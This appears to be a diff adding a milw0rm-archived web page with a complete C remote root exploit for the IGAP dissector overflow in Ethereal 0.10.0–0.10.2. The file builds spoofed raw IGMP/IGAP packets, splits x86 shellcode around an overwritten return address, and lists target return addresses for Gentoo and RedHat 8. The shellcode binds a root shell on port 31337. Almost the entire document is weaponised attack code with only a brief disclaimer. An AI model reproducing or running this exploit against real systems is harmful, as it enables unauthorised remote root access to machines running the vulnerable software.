@@ -1,0 +1,309 @@
+<html><head><title>Ethereal 0.10.0-0.10.2 IGAP Overflow Remote Root Exploit
+</title></head><pre>/* 
+ * THE EYE ON SECURITY RESEARCH GROUP - INDIA
+ * Ethereal IGAP Dissector Message Overflow Remote Root exploit
+ *
+ * Copyright 2004 - EOS-India Group
+ *
+ * Authors note:
+ * Shellcode splitting technique:
+ * Due to difficulty involved while following normal exploitation techniques due to shortage of memory space
+ * for our shellcode, we used the technique of shellcode splitting. In this technique one part of the shellcode
+ * is kept before the buffer which overwrites the saved EIP on stack followed by a jmp OFFSET instruction which
+ * jumps EIP to the second half of the shellcode which is kept after return address. Also since our shellcode 
+ * requires EBP to contain a usuable stack address, we overwrite saved EBP also.
+ *
+ * Disclaimer:
+ * This code is for educational purpose and testing only. The Eye on Security Research Group - India, cannot
+ * be held responsible for any damage caused due to misuse of this code.
+ * This code is a proof of concept exploit for a serious vulnerability that exists in Ethereal 0.10.0 to
+ * Ethereal 0.10.2.
+ *
+ * Nilanjan De [n2n+linuxmail.org] - Abhisek Datta [abhisek+front.ru]
+ * http://www.eos-india.net
+ *
+*/
+#define IPPROTO_IGAP	0x02 // IPPROTO_IGMP=0x02 	
+#define PAYLOAD_SIZE	(255-64)	
+#define MAX_BUFF	sizeof(struct igap_header)+sizeof(struct ipheader)
+#define EXP		&quot;Ethereal(v0.10.0-0.10.2) IGAP Dissector Message Overflow Exploit&quot;
+#define VER		&quot;0.2&quot;
+#define SOCKET_ERROR	-1
+#define MAX_PACKET	10
+#define RETOFFSET 	76 
+#define SRC_IP		&quot;192.31.33.7&quot;
+#include &lt;stdio.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;netdb.h&gt;
+
+#define MAX_ARCH	5
+struct eos{
+	char *arch;
+	unsigned long ret;
+} targets[] = {
+	&quot;tEthereal(0.10.2)-Gentoo(gdb)&quot;,
+	0xbffede50,
+	//-------------------------------
+	&quot;tEthereal(0.10.2)-Gentoo     &quot;,
+	0xbffede10,
+	//-------------------------------
+	&quot;Ethereal(0.10.2)-Gentoo      &quot;,
+	0xbfffd560,
+	//-------------------------------
+	&quot;tEthereal(0.10.2)-RedHat 8   &quot;,
+	0xbffedfb8,
+	//-------------------------------
+	&quot;Ethereal(0.10.2)-RedHat 8    &quot;,
+	0xbfffcd08,
+	//-------------------------------
+	NULL,
+	0
+};
+	
+
+/*
+ x86 linux portbind a shell in port 31337
+ based on shellcode from www.shellcode.com.ar
+ with a few modifications by us
+*/
+ 
+char shellcode_firsthalf[]=
+        /* sys_fork() */
+	&quot;\x31\xc0&quot;                      // xorl         %eax,%eax
+	&quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
+	&quot;\xb0\x02&quot;                      // movb         $0x2,%al
+	&quot;\xcd\x80&quot;                      // int          $0x80
+	&quot;\x38\xc3&quot;                      // cmpl         %ebx,%eax
+	&quot;\x74\x05&quot;                      // je           0x5
+	/* sys_exit() */
+	&quot;\x8d\x43\x01&quot;                  // leal         0x1(%ebx),%eax
+	&quot;\xcd\x80&quot;                      // int          $0x80
+        /* setuid(0) */
+        &quot;\x31\xc0&quot;                      // xorl         %eax,%eax
+        &quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
+        &quot;\xb0\x17&quot;                      // movb         $0x17,%al
+        &quot;\xcd\x80&quot;                      // int          $0x80
+        /* socket() */
+        &quot;\x31\xc0&quot;                      // xorl    %eax,%eax
+        &quot;\x89\x45\x10&quot;                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)
+        &quot;\x40&quot;                          // incl    %eax
+        &quot;\x89\xc3&quot;                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)
+        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)
+        &quot;\x40&quot;                          // incl    %eax
+        &quot;\x89\x45\x08&quot;                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)
+	&quot;\x8d\x4d\x08&quot;                  // leal    0x8(%ebp),%ecx
+        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
+        &quot;\xcd\x80&quot;                      // int     $0x80
+        &quot;\x89\x45\x08&quot;                  // movl    %eax,0x8(%ebp)
+	;	
+char jumpcode[]=&quot;\xeb\x10&quot;;
+
+char shellcode_secondhalf[]=
+        /* bind()*/
+        &quot;\x43&quot;                          // incl    %ebx(SYS_BIND = 0x2)
+        &quot;\x66\x89\x5d\x14&quot;              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)
+	&quot;\x66\xc7\x45\x16\x7a\x69&quot;      // movw    $0x697a,0x16(%ebp)(port=31337)
+        &quot;\x31\xd2&quot;                      // xorl    %edx,%edx
+        &quot;\x89\x55\x18&quot;                  // movl    %edx,0x18(%ebp)
+        &quot;\x8d\x55\x14&quot;                  // leal    0x14(%ebp),%edx
+        &quot;\x89\x55\x0c&quot;                  // movl    %edx,0xc(%ebp)
+        &quot;\xc6\x45\x10\x10&quot;              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)
+        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
+        &quot;\xcd\x80&quot;                      // int     $0x80
+ 
+        /* listen() */
+        &quot;\x40&quot;                          // incl    %eax
+        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)
+        &quot;\x43&quot;                          // incl    %ebx
+        &quot;\x43&quot;                          // incl    %ebx(SYS_LISTEN = 0x4)
+        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
+        &quot;\xcd\x80&quot;                      // int     $0x80
+ 
+        /* accept() */
+        &quot;\x43&quot;                          // incl    %ebx
+        &quot;\x89\x45\x0c&quot;                  // movl    %eax,0xc(%ebp)
+        &quot;\x89\x45\x10&quot;                  // movl    %eax,0x10(%ebp)
+        &quot;\xb0\x66&quot;                      // movb    $0x66,%al
+        &quot;\xcd\x80&quot;                      // int     $0x80
+        &quot;\x89\xc3&quot;                      // movl    %eax,%ebx
+ 
+        /* dup2() */
+        &quot;\x31\xc9&quot;                      // xorl    %ecx,%ecx
+        &quot;\xb0\x3f&quot;                      // movb    $0x3f,%al
+        &quot;\xcd\x80&quot;                      // int     $0x80
+        &quot;\x41&quot;                          // incl    %ecx
+        &quot;\x80\xf9\x03&quot;                  // cmpb    $0x3,%cl
+        &quot;\x75\xf6&quot;                      // jne     -0xa
+ 
+        /* execve() */
+        &quot;\x31\xd2&quot;                      // xorl    %edx,%edx
+        &quot;\x52&quot;                          // pushl   %edx
+        &quot;\x68\x6e\x2f\x73\x68&quot;          // pushl   $0x68732f6e
+        &quot;\x68\x2f\x2f\x62\x69&quot;          // pushl   $0x69622f2f
+        &quot;\x89\xe3&quot;                      // movl    %esp,%ebx
+        &quot;\x52&quot;                          // pushl   %edx
+        &quot;\x53&quot;                          // pushl   %ebx
+        &quot;\x89\xe1&quot;                      // movl    %esp,%ecx
+        &quot;\xb0\x0b&quot;                      // movb    $0xb,%al
+        &quot;\xcd\x80&quot;;                     // int     $0x80
+ 
+struct ipheader {
+	unsigned char ip_hl:4, ip_v:4; 
+	unsigned char ip_tos;
+	unsigned short int ip_len;
+	unsigned short int ip_id;
+	unsigned short int ip_off;
+	unsigned char ip_ttl;
+	unsigned char ip_proto;
+	unsigned short int ip_sum;
+	unsigned int ip_src;
+	unsigned int ip_dst;
+};
+
+struct igap_header { 		// This is a malformed header which does not conforms with IGAP RFC
+	unsigned char igap_type; 	// Message Type
+	unsigned char igap_restime; 	// Response Time
+	unsigned short int igap_cksum; 	// IGAP Message Checksum
+	unsigned int igap_gaddr; 	// Group Address
+	unsigned char igap_ver; 	// Version
+	unsigned char igap_stype;	// SubType
+	unsigned char igap_reserved1;	// Reserved
+	unsigned char igap_cid;		// Challenge ID
+	unsigned char igap_asize;	// Account Size
+	unsigned char igap_msgsize;	// Message Size
+	unsigned short int igap_reserved2;	// Reserved
+	/*
+	unsigned char igap_uaccount[16];// User Account
+	unsigned char igap_message[64]	// Message
+	*/
+	unsigned char igap_payload[16+64+PAYLOAD_SIZE];	
+// This buffer will contain payload, here we differ from RFC by sending a bigger message.
+};
+
+unsigned short checksum(unsigned short *buf,int nwords)
+{
+	unsigned long sum;
+	for (sum = 0; nwords &gt; 0; nwords--)
+		sum += *(buf)++;
+	sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
+	sum += (sum &gt;&gt; 16);
+	return ~sum;
+}
+
+void showhelp(char *pr00gie) {
+	int i=0;
+	printf(&quot;######### The Eye on Security Research Group - India ########\n&quot;);
+	printf(&quot;%s %s\n&quot;,EXP,VER);
+       	printf(&quot;abhisek[at]front[dot]ru - n2n[at]linuxmail[dot]org\n&quot;);
+       	printf(&quot;http://www.eos-india.net\n\n&quot;);
+	printf(&quot;[usage]\n&quot;);
+	printf(&quot;%s [Remote Host] [Target]\n&quot;,pr00gie);
+	printf(&quot;[Available Targets]\n&quot;);
+	while(targets[i].arch != NULL) {
+		printf(&quot;%d. - %s\t - %p\n&quot;,(i),targets[i].arch,targets[i].ret);
+		i++;
+	}
+	exit(1); 
+}
+	      
+int main(int argc,char *argv[]) {
+	char buffer[MAX_BUFF];
+	struct ipheader *iphdr=(struct ipheader*)buffer;
+	struct igap_header *igaphdr=(struct igap_header*)(buffer+sizeof(struct ipheader));
+	int sockfd;
+	unsigned long addr;
+	int one=1;
+	int i;
+	const int *val=&amp;one;
+	struct sockaddr_in sin;
+	unsigned long magic;
+	unsigned int n;
+	
+	if(getuid()) {
+		printf(&quot;- This code opens SOCK_RAW which needs root privilege\n&quot;);
+		exit(1);
+	}
+	if(argc != 3)
+		showhelp(argv[0]);
+	n=atoi(argv[2]);
+	if(n &gt;= MAX_ARCH) {
+		printf(&quot;- Invalid target\n&quot;);
+		showhelp(argv[0]);
+	}
+	magic=targets[n].ret;
+	printf(&quot;-Using RET %p\n&quot;,magic);
+	addr=inet_addr(argv[1]);
+	if(addr==INADDR_NONE) {
+		printf(&quot;- Invalid target\n&quot;);
+		exit(1);
+	}
+	sin.sin_addr.s_addr=addr;
+	sin.sin_family=AF_INET;
+	sin.sin_port=0x00;
+	sockfd=socket(PF_INET,SOCK_RAW,IPPROTO_RAW);
+	if(sockfd==SOCKET_ERROR) {
+		printf(&quot;- Failed creating SOCK_RAW descriptor\n&quot;);
+		exit(1);
+	}
+	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) &lt; 0)
+		printf (&quot;- WARNING !! :Cannot set IP_HDRINCL!\n&quot;);
+	memset(buffer,0x00,MAX_BUFF);
+	// Filling IP Header
+	iphdr-&gt;ip_hl=0x05;
+	iphdr-&gt;ip_v=0x04;
+	iphdr-&gt;ip_tos=0x00;
+	iphdr-&gt;ip_len=MAX_BUFF;
+	iphdr-&gt;ip_id=htonl(54321);
+	iphdr-&gt;ip_off=0x00; // Lower 3 bit=Flag4Fragmentation - Higher 13 Bit=Fragment Offset
+	iphdr-&gt;ip_ttl=0x01;
+	iphdr-&gt;ip_proto=IPPROTO_IGAP; // IPPROTO_IGMP
+	iphdr-&gt;ip_sum=0x00; // Fill sum before sending packet
+	iphdr-&gt;ip_src=inet_addr (SRC_IP); 
+	iphdr-&gt;ip_dst=addr;
+	// Filling IGAP Header
+	igaphdr-&gt;igap_type=0x41; // IGAP Membership Query
+	igaphdr-&gt;igap_restime=0x0a; // 
+	igaphdr-&gt;igap_cksum=0x00; // compute before sending packet
+	igaphdr-&gt;igap_gaddr=0x00; // Ignored in IGAP Membership Query Message
+	igaphdr-&gt;igap_ver=0x01; // IGAPv1
+	igaphdr-&gt;igap_stype=0x21; // Basic Query
+	igaphdr-&gt;igap_reserved1=0x00; // Ignored
+	igaphdr-&gt;igap_cid=0x00; 
+	// Challenge ID (ignored because Chanllenge Response authentication not used)		
+	igaphdr-&gt;igap_asize=0x10; // MAX Size of Account Name Field
+	igaphdr-&gt;igap_msgsize=0x40+PAYLOAD_SIZE; //  Size of Message	
+	igaphdr-&gt;igap_reserved2=0x00; // Reserved
+	// Building exploit buffer
+	//for(i=0;i&lt;16+64+PAYLOAD_SIZE;i++)
+	//	memset(igaphdr-&gt;igap_payload+i,(unsigned char)i,1);
+	memset(igaphdr-&gt;igap_payload,0x90,16+64+PAYLOAD_SIZE);
+	memcpy(igaphdr-&gt;igap_payload+16+RETOFFSET-strlen(shellcode_firsthalf)-8,shellcode_firsthalf,
+	strlen(shellcode_firsthalf));
+	memcpy(igaphdr-&gt;igap_payload+16+64+RETOFFSET-strlen(jumpcode)-4,jumpcode,strlen(jumpcode));
+	memcpy(igaphdr-&gt;igap_payload+16+64+RETOFFSET,&amp;magic,4);
+	magic-=0x10;
+	memcpy(igaphdr-&gt;igap_payload+16+64+RETOFFSET-4,&amp;magic,4);
+	memcpy(igaphdr-&gt;igap_payload+16+64+PAYLOAD_SIZE-strlen(shellcode_secondhalf)-1,
+                shellcode_secondhalf,strlen(shellcode_secondhalf));
+	// Calculating checksum
+	igaphdr-&gt;igap_cksum=checksum((unsigned short*)(buffer+sizeof(struct ipheader)),
+	(sizeof(struct igap_header))&gt;&gt;1);
+	iphdr-&gt;ip_sum = checksum ((unsigned short*)buffer,(iphdr-&gt;ip_len)&gt;&gt;1);
+	// Sending
+	one=MAX_PACKET;
+	while(one) {
+		sendto(sockfd,buffer,MAX_BUFF,0,(struct sockaddr*)&amp;sin,sizeof(sin));
+		printf(&quot;.&quot;);
+		one--;
+	}
+	close(sockfd); 
+	printf(&quot;\n- Send %d packets to %s\n&quot;,MAX_PACKET,argv[1]);	
+	printf(&quot;- Read source to know what to do to check if the exploit worked\n&quot;);
+	return 0;
+}
+
+// milw0rm.com [2004-03-28]</pre></html>
